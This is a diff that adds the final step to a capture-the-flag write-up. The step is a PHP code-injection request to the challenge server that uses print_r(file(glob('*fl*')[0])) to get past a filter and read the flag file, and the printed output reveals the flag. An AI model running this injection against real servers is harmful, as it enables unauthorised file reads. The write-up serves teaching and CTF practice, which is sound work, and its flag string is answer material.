@@ -102,5 +102,13 @@ with this we do get the file name flag.txt
 ![image](https://github.com/m0wn1ka/ctf_writeups/assets/127676379/5371dd6d-b892-4b70-aa48-459a310a2eaa)
 
 
+# at last
+https://www.w3schools.com/php/func_filesystem_file.asp
+![image](https://github.com/m0wn1ka/ctf_writeups/assets/127676379/f6983a82-4080-492e-a684-d7935688e5b6)
+```
+https://ch2474161007.ch.eng.run/?command=print_r(file(glob(%27*fl*%27)[0]));
+Array ( [0] => shaktictf{y0u_byp4553d_7h3_f1l73r5_y4y} ) Command executed 
+```
+
 
 
